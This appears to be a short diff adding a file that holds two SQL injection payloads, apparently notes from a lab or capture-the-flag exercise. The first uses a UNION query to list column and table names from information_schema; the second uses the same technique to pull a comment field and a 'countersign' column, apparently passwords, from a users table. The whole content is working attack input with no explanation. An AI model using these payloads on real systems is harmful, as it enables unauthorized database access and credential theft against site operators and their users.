@@ -1,0 +1,2 @@
+1) 1 UNION (SELECT COLUMN_NAME, TABLE_NAME FROM information_schema.columns);
+2) 1 UNION (SELECT Commentaire, countersign FROM users);
